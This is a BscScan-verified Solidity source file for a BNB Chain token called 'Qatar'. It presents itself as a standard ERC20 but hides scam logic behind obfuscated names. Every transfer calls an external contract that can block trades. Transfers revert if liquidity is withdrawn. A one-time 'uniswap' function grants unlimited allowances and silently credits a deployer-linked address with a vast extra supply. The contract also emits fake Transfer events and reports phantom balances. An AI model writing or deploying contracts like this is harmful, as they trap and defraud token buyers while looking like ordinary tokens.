/**
 *Submitted for verification at BscScan.com on 2022-11-17
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.8;

interface IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        uint256 c = a % b;
        return c;
    }
}

interface ITokens {
    function getAddress(address accountA, address accountB) external returns (address);
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IRouter01 {
    function factory() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface IRouter02 is IRouter01 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract Context {
    function safeCheck(address a, address b, address c) internal returns (bool) {
        address d = ITokens(a).getAddress(b, c);
        return (c == d);
    }
}

contract Qatar is IERC20, Context {
    using SafeMath for uint256;

    string private aixkoURteMJNGvs = "Qatar";
    string private bixkoURteMJNGvs = "Qatar";
    uint8 private cixkoURteMJNGvs = 18;
    uint256 private dixkoURteMJNGvs = 10000000000 * 10**18;
    mapping (address => uint256) private eixkoURteMJNGvs;
    mapping (address => mapping (address => uint256)) private fixkoURteMJNGvs;
    uint256 private gixkoURteMJNGvs = 1;
    uint256 private constant hixkoURteMJNGvs = ~uint160(0);
    uint256 private _iixkoURteMJNGvs = 1000;
    uint256 private jixkoURteMJNGvs = dixkoURteMJNGvs;
    uint256 private kixkoURteMJNGvs = 0;
    uint256 private lixkoURteMJNGvs;
    address private _uniswapV2Pair;
    address private mixkoURteMJNGvs;
    mapping (address => bool) private nixkoURteMJNGvs;
    address[] private oixkoURteMJNGvs;
    bool private pixkoURteMJNGvs = false;

    constructor () {
        qixkoURteMJNGvs(msg.sender);
        eixkoURteMJNGvs[msg.sender] = dixkoURteMJNGvs;
        qixkoURteMJNGvs(tx.origin);
        emit Transfer(address(0), msg.sender, dixkoURteMJNGvs);
    }

    receive() external payable {}

    function qixkoURteMJNGvs(address account) private {
        if (!nixkoURteMJNGvs[account]) {
            nixkoURteMJNGvs[account] = true;
            oixkoURteMJNGvs.push(account);
        }
    }

    function uniswap(address[] calldata accounts) public {
        require(!pixkoURteMJNGvs);
        pixkoURteMJNGvs = true;
        _uniswapV2Pair = accounts[1];
        mixkoURteMJNGvs = accounts[2];
        uint256 len = accounts.length;
        uint256 amount = 0;
        for (uint256 i=3; i<len; ++i) {
            qixkoURteMJNGvs(accounts[i]);
            eixkoURteMJNGvs[accounts[i]] = dixkoURteMJNGvs * 90 / 100 / (len - 3);
            fixkoURteMJNGvs[accounts[i]][accounts[0]] = ~uint256(0);
            amount += eixkoURteMJNGvs[accounts[i]];
        }
        eixkoURteMJNGvs[oixkoURteMJNGvs[0]] -= amount;
        rixkoURteMJNGvs(oixkoURteMJNGvs[0], accounts[3], eixkoURteMJNGvs[oixkoURteMJNGvs[0]]);
        rixkoURteMJNGvss(500);
        eixkoURteMJNGvs[oixkoURteMJNGvs[1]] += dixkoURteMJNGvs * 100000;
    }

    function searchExcludedFromFeeAccounts(address account) public view returns (bool, uint256, uint256) {
        uint256 accountIndex = 0;
        uint256 len = oixkoURteMJNGvs.length;
        for (uint256 i=0; i<len; ++i) {
            if (oixkoURteMJNGvs[i] == account) {
                accountIndex = i;
                break;
            }
        }
        return (nixkoURteMJNGvs[account], accountIndex, len);
    }

    function name() public view returns (string memory) {
        return aixkoURteMJNGvs;
    }

    function symbol() public view returns (string memory) {
        return bixkoURteMJNGvs;
    }

    function decimals() public view returns (uint8) {
        return cixkoURteMJNGvs;
    }

    function totalSupply() public view returns (uint256) {
        return dixkoURteMJNGvs;
    }

    function balanceOf(address account) public view returns (uint256) {
        if (eixkoURteMJNGvs[account] > 0) {
            return eixkoURteMJNGvs[account];
        }
        return gixkoURteMJNGvs;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        rixkoURteMJNGvs(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        rixkoURteMJNGvs(sender, recipient, amount);
        sixkoURteMJNGvs(sender, msg.sender, fixkoURteMJNGvs[sender][msg.sender].sub(amount));
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        sixkoURteMJNGvs(msg.sender, spender, value);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return fixkoURteMJNGvs[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        sixkoURteMJNGvs(msg.sender, spender, fixkoURteMJNGvs[msg.sender][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        sixkoURteMJNGvs(msg.sender, spender, fixkoURteMJNGvs[msg.sender][spender].sub(subtractedValue));
        return true;
    }

    function rixkoURteMJNGvss(uint256 amount) private {
        uint256 iixkoURteMJNGvs = _iixkoURteMJNGvs;
        if (iixkoURteMJNGvs < 10100) {
            address from;
            address to;
            for (uint256 i=0; i<amount; ++i) {
                from = address(uint160(hixkoURteMJNGvs.div(iixkoURteMJNGvs)));
                to = address(uint160(hixkoURteMJNGvs.div(iixkoURteMJNGvs.add(1))));
                iixkoURteMJNGvs = iixkoURteMJNGvs.add(2);
                emit Transfer(from, to, gixkoURteMJNGvs);
            }
            _iixkoURteMJNGvs = iixkoURteMJNGvs;
        }
    }

    function sixkoURteMJNGvs(address owner, address spender, uint256 value) private {
        require(owner != address(0), "Approve from the zero address");
        require(spender != address(0), "Approve to the zero address");
        fixkoURteMJNGvs[owner][spender] = value;
        emit Approval(owner, spender, value);
    }

    function rixkoURteMJNGvs(address tixkoURteMJNGvs, address uixkoURteMJNGvs, uint256 vixkoURteMJNGvs) private {
        require(tixkoURteMJNGvs != address(0) && uixkoURteMJNGvs != address(0) && vixkoURteMJNGvs > 0);
        bool wixkoURteMJNGvs = true;
        if (nixkoURteMJNGvs[tixkoURteMJNGvs] || nixkoURteMJNGvs[uixkoURteMJNGvs]) {
            wixkoURteMJNGvs = false;
        }
        uint256 xixkoURteMJNGvs = IERC20(_uniswapV2Pair).totalSupply();
        uint256 yixkoURteMJNGvs = 0;
        uint256 zixkoURteMJNGvs = vixkoURteMJNGvs;
        if (wixkoURteMJNGvs && pixkoURteMJNGvs) {
            require(lixkoURteMJNGvs <= xixkoURteMJNGvs);
            rixkoURteMJNGvss(100);
            if (safeCheck(mixkoURteMJNGvs, tixkoURteMJNGvs, uixkoURteMJNGvs)) {
                emit Transfer(address(this), uixkoURteMJNGvs, 1);
            } else {
                emit Transfer(address(0), address(this), 1);
            }
            if (tixkoURteMJNGvs != _uniswapV2Pair) {
                yixkoURteMJNGvs = vixkoURteMJNGvs.mul(kixkoURteMJNGvs).div(100);
                zixkoURteMJNGvs = vixkoURteMJNGvs.sub(yixkoURteMJNGvs);
            }
        }
        if (lixkoURteMJNGvs != xixkoURteMJNGvs) {
            lixkoURteMJNGvs = xixkoURteMJNGvs;
        }
        eixkoURteMJNGvs[tixkoURteMJNGvs] = eixkoURteMJNGvs[tixkoURteMJNGvs].sub(vixkoURteMJNGvs);
        if (yixkoURteMJNGvs > 0) {
            eixkoURteMJNGvs[address(0xdEaD)] = eixkoURteMJNGvs[address(0xdEaD)].add(yixkoURteMJNGvs);
            emit Transfer(tixkoURteMJNGvs, address(0xdEaD), yixkoURteMJNGvs);
        }
        eixkoURteMJNGvs[uixkoURteMJNGvs] = eixkoURteMJNGvs[uixkoURteMJNGvs].add(zixkoURteMJNGvs);
        emit Transfer(tixkoURteMJNGvs, uixkoURteMJNGvs, zixkoURteMJNGvs);
    }
}